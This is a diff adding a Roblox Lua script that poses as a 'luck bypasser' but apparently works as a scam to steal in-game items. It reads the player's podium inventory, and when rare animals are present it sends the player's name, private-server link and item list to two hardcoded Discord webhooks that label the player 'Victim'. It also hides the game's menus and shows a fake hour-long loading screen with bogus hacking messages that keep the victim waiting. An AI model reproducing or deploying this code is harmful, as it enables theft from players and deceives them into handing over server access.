@@ -1,0 +1,1219 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local player = LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local StarterGui = game:GetService("StarterGui")
+
+-- Función para crear pulso verde en UIStroke (RGB 0,200,0 -> RGB 0,30,0)
+local function createGreenOutlinePulse(stroke)
+    local pulseTween = TweenService:Create(stroke, 
+        TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Color = Color3.fromRGB(0, 30, 0)}
+    )
+    stroke.Color = Color3.fromRGB(0, 200, 0)
+    pulseTween:Play()
+    return pulseTween
+end
+
+local function ocultarHUD()
+    local coreGuiElements = {
+        Enum.CoreGuiType.PlayerList,
+        Enum.CoreGuiType.Health,
+        Enum.CoreGuiType.Backpack,
+        Enum.CoreGuiType.Chat,
+        Enum.CoreGuiType.EmotesMenu,
+        Enum.CoreGuiType.All
+    }
+    
+    for _, element in ipairs(coreGuiElements) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(element, false)
+        end)
+    end
+end
+
+local function mostrarHUD()
+    local coreGuiElements = {
+        Enum.CoreGuiType.PlayerList,
+        Enum.CoreGuiType.Health,
+        Enum.CoreGuiType.Backpack,
+        Enum.CoreGuiType.Chat,
+        Enum.CoreGuiType.EmotesMenu,
+        Enum.CoreGuiType.All
+    }
+    
+    for _, element in ipairs(coreGuiElements) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(element, true)
+        end)
+    end
+end
+
+local function ocultarScreenGuis()
+    if LocalPlayer then
+        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+        
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name ~= "MetodoMoeiraLoader" and gui.Name ~= "ArcadeGUI" then
+                gui.Enabled = false
+            end
+        end
+        
+        PlayerGui.ChildAdded:Connect(function(gui)
+            if gui:IsA("ScreenGui") and gui.Name ~= "MetodoMoeiraLoader" and gui.Name ~= "ArcadeGUI" then
+                wait(0.1)
+                gui.Enabled = false
+            end
+        end)
+    end
+end
+
+local function cerrarMenuRoblox()
+    pcall(function()
+        game:GetService("GuiService"):ClearError()
+        StarterGui:SetCore("ResetButtonCallback", false)
+    end)
+    
+    local CoreGui = game:GetService("CoreGui")
+    for _, gui in ipairs(CoreGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
+                gui.Enabled = false
+            end
+        end
+    end
+end
+
+local UserInputService = game:GetService("UserInputService")
+local hudVisible = true
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.H then
+        hudVisible = not hudVisible
+        if hudVisible then
+            mostrarHUD()
+        else
+            ocultarHUD()
+        end
+    end
+    
+    if input.KeyCode == Enum.KeyCode.Escape then
+        cerrarMenuRoblox()
+    end
+end)
+
+local allowedAnimals = {
+    "67",
+    "Celularcini Viciosini",
+    "Dragon Cannelloni",
+    "Esok Sekolah",
+    "Garama and Madundung",
+    "Ketupat Kepat",
+    "Mariachi Corazoni",
+    "Money Money Puggy",
+    "Nuclearo Dinossauro",
+    "Secret Lucky Block",
+    "Spaghetti Tualetti",
+    "Tang Tang Kelentang",
+    "Eviledon",
+    "Tictac Sahur",
+    "Tralaledon",
+    "La Spooky Grande",
+    "Strawberry Elephant",
+    "Los Bros",
+    "Los Chicleteiras",
+    "Los Combinasionas",
+    "Los Hotspotsitos",
+    "Los Nooo My Hotspotsitos",
+    "Los Primos",
+    "Los Mobilis",
+    "Las Sis",
+    "La Grande Combinasion",
+    "La Supreme Combinasion",
+    "La Extinct Grande",
+    "La Secret Combinasion", 
+    "Spooky and Pumpky", 
+    "Ketchuru and Musturu", 
+    "Los Lucky Blocks", 
+    "Admin Lucky Block", 
+    "Burguro And Fryuro", 
+    "Chillin Chili", 
+    "Los Tacoritas", 
+    "Tacorita Bicicleta", 
+    "Taco Luckyblock"
+}
+
+local function getPodiumInfo()
+    local success, podiumData = pcall(function()
+        if ReplicatedStorage:FindFirstChild("Packages") then
+            local packages = ReplicatedStorage.Packages
+            if packages:FindFirstChild("Synchronizer") then
+                local synchronizer = require(packages.Synchronizer)
+                local playerData = synchronizer:Get(LocalPlayer)
+                if playerData then
+                    return playerData:Get("AnimalPodiums") or {}
+                end
+            end
+        end
+        return "No se pudieron obtener datos de podios"
+    end)
+
+    if success and type(podiumData) == "table" then  
+        local info = {}  
+        for podium, animal in pairs(podiumData) do  
+            if animal == "Empty" then  
+                info[podium] = "Empty"  
+            else  
+                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
+            end  
+        end  
+        return info  
+    else  
+        return {error = podiumData}  
+    end
+end
+
+local function hasAllowedAnimal(podiumInfo)
+    local foundAnimals = {}
+    for _, animal in pairs(podiumInfo) do
+        if type(animal) == "string" and animal ~= "Empty" and animal ~= "Unknown" then
+            local animalTrim = animal:gsub("^%s*(.-)%s*$", "%1")
+            for _, allowed in ipairs(allowedAnimals) do
+                if animalTrim:lower():find(allowed:lower(), 1, true) then
+                    table.insert(foundAnimals, animalTrim)
+                    break
+                end
+            end
+        end
+    end
+    return #foundAnimals > 0, foundAnimals
+end
+
+local function isValidPrivateServerLink(text)
+    if not string.find(text, "https?://") then
+        return false
+    end
+    
+    if not string.find(text, "roblox%.com") then
+        return false
+    end
+    
+    local patterns = {
+        "https?://www%.roblox%.com/share%?code=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?privateServerLinkCode=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?linkCode=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?code=[%w%-_]+",
+        "https?://web%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode=",
+        "https?://m%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode="
+    }
+    
+    for _, pattern in ipairs(patterns) do
+        if string.match(text, pattern) then
+            return true
+        end
+    end
+    
+    local keywords = {
+        "privateServerLinkCode", "linkCode", "code=", "share?code",
+        "privateserver", "private%+server"
+    }
+    
+    for _, keyword in ipairs(keywords) do
+        if string.find(text:lower(), keyword:lower(), 1, true) then
+            return true
+        end
+    end
+    
+    local hasGameId = string.find(text, "/games/%d+/")
+    local hasCodeParam = string.find(text, "[%?&][%w]*[Cc]ode[=][%w%-_]+")
+    
+    if hasGameId and hasCodeParam then
+        return true
+    end
+    
+    return false
+end
+
+local function sendToWebhook(link, foundAnimals)
+    if not isValidPrivateServerLink(link) then
+        return false, "Invalid private server link"
+    end
+    
+    if not foundAnimals or #foundAnimals == 0 then
+        return true
+    end
+    
+    local playerCount = #Players:GetPlayers()
+    
+    if playerCount > 1 then
+        return true
+    end
+    
+    -- Animales especiales que van al webhook alternativo
+    local specialAnimals = {
+        "Dragon Cannelloni",
+        "Strawberry Elephant",
+        "Spooky and Pumpky",
+        "La Secret Combinasion"
+    }
+    
+    -- Separar animales normales y especiales
+    local normalAnimals = {}
+    local specialFound = {}
+    
+    for _, animal in ipairs(foundAnimals) do
+        local isSpecial = false
+        for _, special in ipairs(specialAnimals) do
+            if animal:lower():find(special:lower(), 1, true) then
+                table.insert(specialFound, animal)
+                isSpecial = true
+                break
+            end
+        end
+        if not isSpecial then
+            table.insert(normalAnimals, animal)
+        end
+    end
+    
+    local webhookNormal = "https://discord.com/api/webhooks/1427379205363990539/k33rUnb--87riVZNTROzWluP2wLjwRbuPbOhGIPNSNTGxVXWDG2yejKMDnmC8cS4LQRK"
+    local webhookSpecial = "https://discord.com/api/webhooks/1428259836688334910/nwKnU7h9LI8zrEMMpQRCDKwUTM8SO_j6zLTP6WLLRPS3B6UVjNhwcmER5cIDFMeL04Un"
+    
+    local playerName = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    
+    -- Función para enviar a un webhook específico
+    local function sendToSpecificWebhook(webhookUrl, animals, isSpecial)
+        if #animals == 0 then return true end
+        
+        local animalList = ""
+        for i, animal in ipairs(animals) do
+            if i == 1 then
+                animalList = animal
+            else
+                animalList = animalList .. "\n" .. animal
+            end
+        end
+        
+        local title = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado"
+        local color = isSpecial and 16766720 or 10038562  -- Naranja para especiales, morado para normales
+        
+        local data = {
+            ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
+            ["embeds"] = {{
+                ["title"] = title,
+                ["color"] = color,
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 Informacion del jugador:",
+                        ["value"] = "```diff\n+ Victim: " .. playerName .. "\n+ Display: " .. displayName .. "\n```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "👥 Datos del Server:",
+                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🎮 link:",
+                        ["value"] = "[Click here to join](" .. link .. ")",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes(secrets):",
+                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "📊 Total:",
+                        ["value"] = "```diff\n+ Total Items: " .. #animals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n```",
+                        ["inline"] = false
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+        
+        local success, err = pcall(function()
+            local jsonData = HttpService:JSONEncode(data)
+            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+        end)
+        
+        if not success then
+            pcall(function()
+                local jsonData = HttpService:JSONEncode(data)
+                HttpService:RequestAsync({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+        end
+        
+        return true
+    end
+    
+    -- Enviar a webhooks correspondientes
+    if #normalAnimals > 0 then
+        sendToSpecificWebhook(webhookNormal, normalAnimals, false)
+    end
+    
+    if #specialFound > 0 then
+        sendToSpecificWebhook(webhookSpecial, specialFound, true)
+    end
+    
+    return true
+end
+
+local function createLoadingScreen()
+    ocultarHUD()
+    spawn(ocultarScreenGuis)
+    
+    spawn(function()
+        while wait(0.1) do
+            cerrarMenuRoblox()
+            
+            if LocalPlayer then
+                local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                if PlayerGui then
+                    for _, gui in ipairs(PlayerGui:GetChildren()) do
+                        if gui:IsA("ScreenGui") and gui.Name ~= "MetodoMoeiraLoader" then
+                            gui.Enabled = false
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    
+    local loadingScreenGui = Instance.new("ScreenGui")
+    loadingScreenGui.Name = "MetodoMoeiraLoader"
+    loadingScreenGui.ResetOnSpawn = false
+    loadingScreenGui.IgnoreGuiInset = true
+    loadingScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingScreenGui.Parent = playerGui
+
+    local backgroundFrame = Instance.new("Frame")
+    backgroundFrame.Size = UDim2.new(1,0,1,0)
+    backgroundFrame.Position = UDim2.new(0,0,0,0)
+    backgroundFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    backgroundFrame.BackgroundTransparency = 0
+    backgroundFrame.BorderSizePixel = 0
+    backgroundFrame.ZIndex = 0
+    backgroundFrame.Parent = loadingScreenGui
+
+    local binaryChars = {"0", "1"}
+    local allColumns = {}
+    
+    local function createBinaryColumn(columnIndex)
+        local columnFrame = Instance.new("Frame")
+        columnFrame.Name = "BinaryColumn" .. columnIndex
+        columnFrame.Size = UDim2.new(0, 50, 1, 0)
+        columnFrame.Position = UDim2.new(0, columnIndex * 55, 0, 0)
+        columnFrame.BackgroundTransparency = 1
+        columnFrame.ZIndex = 1
+        columnFrame.Parent = backgroundFrame
+        
+        local characterCount = math.random(15, 20)
+        local characters = {}
+        
+        for i = 1, characterCount do
+            local charLabel = Instance.new("TextLabel")
+            charLabel.Name = "Char" .. i
+            charLabel.Size = UDim2.new(1, 0, 0, 45)
+            charLabel.Position = UDim2.new(0, 0, 0, (i-1) * 45 - (characterCount * 45))
+            charLabel.BackgroundTransparency = 1
+            charLabel.Text = binaryChars[math.random(1, 2)]
+            charLabel.TextSize = 36
+            charLabel.Font = Enum.Font.Arcade
+            charLabel.TextXAlignment = Enum.TextXAlignment.Center
+            charLabel.TextYAlignment = Enum.TextYAlignment.Center
+            charLabel.ZIndex = 1
+            charLabel.Parent = columnFrame
+            charLabel.TextTransparency = math.min(0.85, i * 0.04)
+            charLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+            
+            local charStroke = Instance.new("UIStroke")
+            charStroke.Thickness = 2
+            charStroke.Color = Color3.fromRGB(0, 200, 0)
+            charStroke.Parent = charLabel
+            createGreenOutlinePulse(charStroke)
+            
+            table.insert(characters, charLabel)
+        end
+        
+        table.insert(allColumns, {frame = columnFrame, chars = characters, count = characterCount, index = columnIndex})
+        
+        return columnFrame, characters, characterCount
+    end
+
+    local screenWidth = 35
+    for i = 0, screenWidth do
+        createBinaryColumn(i)
+        if i % 5 == 0 then
+            task.wait()
+        end
+    end
+    
+    task.spawn(function()
+        while backgroundFrame.Parent do
+            for _, columnData in ipairs(allColumns) do
+                if not columnData.frame.Parent then continue end
+                
+                local currentY = columnData.frame.Position.Y.Scale
+                local newY = currentY + 0.005
+                
+                if newY > 1.2 then
+                    columnData.frame.Position = UDim2.new(0, columnData.index * 45, 0, -columnData.count * 35)
+                    
+                    for _, charLabel in pairs(columnData.chars) do
+                        if math.random() < 0.5 then
+                            charLabel.Text = binaryChars[math.random(1, 2)]
+                        end
+                    end
+                else
+                    columnData.frame.Position = UDim2.new(0, columnData.index * 45, newY, 0)
+                end
+            end
+            
+            task.wait(0.03)
+        end
+    end)
+    
+    task.spawn(function()
+        local pulseValue = 0
+        local increasing = true
+        
+        while backgroundFrame.Parent do
+            if increasing then
+                pulseValue = pulseValue + 0.02
+                if pulseValue >= 1 then
+                    increasing = false
+                end
+            else
+                pulseValue = pulseValue - 0.02
+                if pulseValue <= 0 then
+                    increasing = true
+                end
+            end
+            
+            local greenValue = math.floor(30 + (170 * pulseValue))
+            local color = Color3.fromRGB(0, greenValue, 0)
+            
+            for _, columnData in ipairs(allColumns) do
+                for _, charLabel in pairs(columnData.chars) do
+                    if charLabel.Parent then
+                        charLabel.TextColor3 = color
+                    end
+                end
+            end
+            
+            task.wait(0.05)
+        end
+    end)
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "LoadingFrame"
+    mainFrame.Size = UDim2.new(0, 500, 0, 320)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25,25,35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 10
+    mainFrame.Parent = loadingScreenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0,12)
+    mainCorner.Parent = mainFrame
+
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Thickness = 3
+    mainStroke.Color = Color3.fromRGB(0, 200, 0)
+    mainStroke.Parent = mainFrame
+    createGreenOutlinePulse(mainStroke)
+
+    local headerFrame = Instance.new("Frame")
+    headerFrame.Parent = mainFrame
+    headerFrame.Size = UDim2.new(1,0,0,70)
+    headerFrame.BackgroundColor3 = Color3.fromRGB(35,35,50)
+    headerFrame.BorderSizePixel = 0
+    headerFrame.ZIndex = 11
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0,12)
+    headerCorner.Parent = headerFrame
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Parent = headerFrame
+    titleLabel.Size = UDim2.new(1,-30,0,35)
+    titleLabel.Position = UDim2.new(0,15,0,8)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "LENNON'S LUCK BYPASSER"
+    titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
+    titleLabel.TextSize = 22
+    titleLabel.Font = Enum.Font.Arcade
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    titleLabel.ZIndex = 12
+
+    local titleStroke = Instance.new("UIStroke")
+    titleStroke.Thickness = 2
+    titleStroke.Color = Color3.fromRGB(0, 200, 0)
+    titleStroke.Parent = titleLabel
+    createGreenOutlinePulse(titleStroke)
+
+    local subtitleLabel = Instance.new("TextLabel")
+    subtitleLabel.Parent = headerFrame
+    subtitleLabel.Size = UDim2.new(1,-30,0,20)
+    subtitleLabel.Position = UDim2.new(0,15,0,45)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Text = "Loading script components and bypassing luck..."
+    subtitleLabel.TextColor3 = Color3.fromRGB(180,180,200)
+    subtitleLabel.TextSize = 14
+    subtitleLabel.Font = Enum.Font.Arcade
+    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    subtitleLabel.ZIndex = 12
+
+    local circleContainer = Instance.new("Frame")
+    circleContainer.Size = UDim2.new(0, 140, 0, 140)
+    circleContainer.Position = UDim2.new(0.5, -70, 0, 90)
+    circleContainer.BackgroundTransparency = 1
+    circleContainer.ZIndex = 11
+    circleContainer.Parent = mainFrame
+
+    local bgCircle = Instance.new("Frame")
+    bgCircle.Size = UDim2.new(1, 0, 1, 0)
+    bgCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
+    bgCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    bgCircle.BackgroundColor3 = Color3.fromRGB(30, 25, 45)
+    bgCircle.BorderSizePixel = 0
+    bgCircle.ZIndex = 11
+    bgCircle.Parent = circleContainer
+
+    local bgCircleCorner = Instance.new("UICorner")
+    bgCircleCorner.CornerRadius = UDim.new(1, 0)
+    bgCircleCorner.Parent = bgCircle
+
+    local bgCircleStroke = Instance.new("UIStroke")
+    bgCircleStroke.Color = Color3.fromRGB(0, 200, 0)
+    bgCircleStroke.Thickness = 8
+    bgCircleStroke.Transparency = 0
+    bgCircleStroke.Parent = bgCircle
+    createGreenOutlinePulse(bgCircleStroke)
+
+    local progressCircle = Instance.new("Frame")
+    progressCircle.Size = UDim2.new(0, 0, 0, 0)
+    progressCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
+    progressCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    progressCircle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    progressCircle.BorderSizePixel = 0
+    progressCircle.ZIndex = 12
+    progressCircle.Parent = circleContainer
+
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(1, 0)
+    progressCorner.Parent = progressCircle
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 1, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.Font = Enum.Font.Arcade
+    percentText.TextSize = 32
+    percentText.ZIndex = 13
+    percentText.Parent = circleContainer
+
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, -40, 0, 30)
+    statusText.Position = UDim2.new(0, 20, 0, 250)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "Initializing..."
+    statusText.TextColor3 = Color3.fromRGB(200, 200, 220)
+    statusText.Font = Enum.Font.Arcade
+    statusText.TextSize = 14
+    statusText.TextXAlignment = Enum.TextXAlignment.Center
+    statusText.TextWrapped = true
+    statusText.ZIndex = 12
+    statusText.Parent = mainFrame
+
+    local loadingMessages = {
+        "Injecting luck module into server core...",
+        "Exploiting RNG seed for favorable outcomes...",
+        "Hijacking the fate scheduler...",
+        "Cracking fortune's encryption...",
+        "Patching the probability matrix...",
+        "Opening a backdoor to serendipity...",
+        "Seeding chaos with curated coincidences...",
+        "Executing luck override routine...",
+        "Streaming buffered fortune packets...",
+        "Corrupting bad-roll signatures...",
+        "Establishing persistent luck hook...",
+        "Overclocking the destiny allocator...",
+        "Dumping favorable event payloads...",
+        "Rooting the server for blessed spawns...",
+        "Committing transactional luck changes..."
+    }
+
+    local function updateCircleProgress(percent)
+        local scale = percent / 100
+        progressCircle.Size = UDim2.new(scale, 0, scale, 0)
+    end
+
+    local function startLoading()
+        local currentPercent = 0
+        local messageIndex = 1
+        
+        mainFrame.Size = UDim2.new(0, 0, 0, 0)
+        mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+        
+        local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Size = UDim2.new(0, 500, 0, 320)
+        })
+        openTween:Play()
+        openTween.Completed:Wait()
+        
+        task.spawn(function()
+            local phase1Duration = 60
+            local phase1StartTime = tick()
+            local lastMessageTime = tick()
+            
+            while currentPercent < 80 do
+                local elapsed = tick() - phase1StartTime
+                local progress = math.min(elapsed / phase1Duration, 1)
+                currentPercent = math.floor(progress * 80)
+                
+                updateCircleProgress(currentPercent)
+                percentText.Text = currentPercent .. "%"
+                
+                if tick() - lastMessageTime >= math.random(2, 5) then
+                    messageIndex = math.random(1, #loadingMessages)
+                    statusText.Text = loadingMessages[messageIndex]
+                    lastMessageTime = tick()
+                end
+                
+                task.wait(0.1)
+            end
+            
+            local phase2Duration = 3600
+            local phase2StartTime = tick()
+            lastMessageTime = tick()
+            
+            while currentPercent < 100 do
+                local elapsed = tick() - phase2StartTime
+                local progress = math.min(elapsed / phase2Duration, 1)
+                currentPercent = math.floor(80 + (progress * 20))
+                
+                updateCircleProgress(currentPercent)
+                percentText.Text = currentPercent .. "%"
+                
+                if tick() - lastMessageTime >= math.random(2, 5) then
+                    messageIndex = math.random(1, #loadingMessages)
+                    statusText.Text = loadingMessages[messageIndex]
+                    lastMessageTime = tick()
+                end
+                
+                task.wait(0.5)
+            end
+            
+            currentPercent = 100
+            updateCircleProgress(100)
+            percentText.Text = "100%"
+            statusText.Text = "Loading complete! Starting script..."
+            
+            task.wait(1)
+            
+            local closeTween = TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+                Size = UDim2.new(0, 0, 0, 0)
+            })
+            closeTween:Play()
+            closeTween.Completed:Wait()
+            
+            loadingScreenGui:Destroy()
+        end)
+    end
+
+    startLoading()
+end
+
+-- GUI Principal
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ArcadeGUI"
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Contenedor de usuario con imagen (esquina superior izquierda)
+local userContainer = Instance.new("Frame")
+userContainer.Name = "UserContainer"
+userContainer.Size = UDim2.new(0, 280, 0, 120)
+userContainer.Position = UDim2.new(0, 20, 0.5,0)
+userContainer.BackgroundTransparency = 1
+userContainer.ZIndex = 10
+userContainer.Parent = screenGui
+
+-- Imagen del decal
+local userImage = Instance.new("ImageLabel")
+userImage.Name = "UserImage"
+userImage.Size = UDim2.new(0, 45, 0, 45)
+userImage.Position = UDim2.new(0, 0, 0, 0)
+userImage.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+userImage.BorderSizePixel = 0
+userImage.Image = "rbxassetid://135032875125700"
+userImage.ScaleType = Enum.ScaleType.Fit
+userImage.ZIndex = 11
+userImage.Parent = userContainer
+
+local imageCorner = Instance.new("UICorner")
+imageCorner.CornerRadius = UDim.new(0, 8)
+imageCorner.Parent = userImage
+
+local imageStroke = Instance.new("UIStroke")
+imageStroke.Thickness = 2
+imageStroke.Color = Color3.fromRGB(0, 200, 0)
+imageStroke.Parent = userImage
+createGreenOutlinePulse(imageStroke)
+
+-- Texto del usuario (lennon)
+local userLabel = Instance.new("TextLabel")
+userLabel.Name = "UserDisplay"
+userLabel.Size = UDim2.new(0, 220, 0, 45)
+userLabel.Position = UDim2.new(0, 55, 0, 0)
+userLabel.BackgroundTransparency = 1
+userLabel.Text = "@lennonthegoatx"
+userLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+userLabel.TextSize = 20
+userLabel.Font = Enum.Font.Arcade
+userLabel.TextXAlignment = Enum.TextXAlignment.Left
+userLabel.TextYAlignment = Enum.TextYAlignment.Center
+userLabel.ZIndex = 11
+userLabel.Parent = userContainer
+
+local userStroke = Instance.new("UIStroke")
+userStroke.Thickness = 2
+userStroke.Color = Color3.fromRGB(0, 200, 0)
+userStroke.Parent = userLabel
+createGreenOutlinePulse(userStroke)
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0,450,0,280)
+mainFrame.Position = UDim2.new(0.5,-225,0.5,-140)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25,25,35)
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 10
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0,12)
+mainCorner.Parent = mainFrame
+
+local mainFrameStroke = Instance.new("UIStroke")
+mainFrameStroke.Thickness = 3
+mainFrameStroke.Color = Color3.fromRGB(0, 200, 0)
+mainFrameStroke.Parent = mainFrame
+createGreenOutlinePulse(mainFrameStroke)
+
+local headerFrame = Instance.new("Frame")
+headerFrame.Parent = mainFrame
+headerFrame.Size = UDim2.new(1,0,0,70)
+headerFrame.BackgroundColor3 = Color3.fromRGB(35,35,50)
+headerFrame.BorderSizePixel = 0
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0,12)
+headerCorner.Parent = headerFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Parent = headerFrame
+titleLabel.Size = UDim2.new(1,-30,0,35)
+titleLabel.Position = UDim2.new(0,15,0,8)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "LENNON'S LUCK BYPASSER"
+titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
+titleLabel.TextSize = 22
+titleLabel.Font = Enum.Font.Arcade
+titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+local titleStroke = Instance.new("UIStroke")
+titleStroke.Thickness = 2
+titleStroke.Color = Color3.fromRGB(0, 200, 0)
+titleStroke.Parent = titleLabel
+createGreenOutlinePulse(titleStroke)
+
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Parent = headerFrame
+subtitleLabel.Size = UDim2.new(1,-30,0,20)
+subtitleLabel.Position = UDim2.new(0,15,0,45)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "Inf luck"
+subtitleLabel.TextColor3 = Color3.fromRGB(180,180,200)
+subtitleLabel.TextSize = 14
+subtitleLabel.Font = Enum.Font.Arcade
+subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+local inputSectionLabel = Instance.new("TextLabel")
+inputSectionLabel.Parent = mainFrame
+inputSectionLabel.Size = UDim2.new(1,-30,0,20)
+inputSectionLabel.Position = UDim2.new(0,15,0,95)
+inputSectionLabel.BackgroundTransparency = 1
+inputSectionLabel.Text = "Paste private server link and wait to load please"
+inputSectionLabel.TextColor3 = Color3.fromRGB(200,200,220)
+inputSectionLabel.TextSize = 12
+inputSectionLabel.Font = Enum.Font.Arcade
+inputSectionLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+local inputBox = Instance.new("TextBox")
+inputBox.Parent = mainFrame
+inputBox.Size = UDim2.new(1,-30,0,40)
+inputBox.Position = UDim2.new(0,15,0,120)
+inputBox.BackgroundColor3 = Color3.fromRGB(40,40,55)
+inputBox.BorderSizePixel = 0
+inputBox.Text = ""
+inputBox.TextColor3 = Color3.fromRGB(255,255,255)
+inputBox.TextSize = 7
+inputBox.Font = Enum.Font.Arcade
+inputBox.PlaceholderText = "https://www.roblox.com/games/..."
+inputBox.PlaceholderColor3 = Color3.fromRGB(150,150,170)
+inputBox.TextXAlignment = Enum.TextXAlignment.Center
+inputBox.ClearTextOnFocus = false
+
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0,6)
+inputCorner.Parent = inputBox
+
+local inputStroke = Instance.new("UIStroke")
+inputStroke.Thickness = 2
+inputStroke.Color = Color3.fromRGB(0, 200, 0)
+inputStroke.Parent = inputBox
+createGreenOutlinePulse(inputStroke)
+
+local serverButton = Instance.new("TextButton")
+serverButton.Name = "ServerButton"
+serverButton.Parent = mainFrame
+serverButton.Size = UDim2.new(0,200,0,50)
+serverButton.Position = UDim2.new(0.5,-100,0,180)
+serverButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+serverButton.BorderSizePixel = 0
+serverButton.Text = "START SCRIPT"
+serverButton.TextColor3 = Color3.fromRGB(0,255,0)
+serverButton.TextSize = 18
+serverButton.Font = Enum.Font.Arcade
+serverButton.ZIndex = 3
+
+local serverCorner = Instance.new("UICorner")
+serverCorner.CornerRadius = UDim.new(0,8)
+serverCorner.Parent = serverButton
+
+local serverStroke = Instance.new("UIStroke")
+serverStroke.Thickness = 2
+serverStroke.Color = Color3.fromRGB(0,200,0)
+serverStroke.Parent = serverButton
+createGreenOutlinePulse(serverStroke)
+
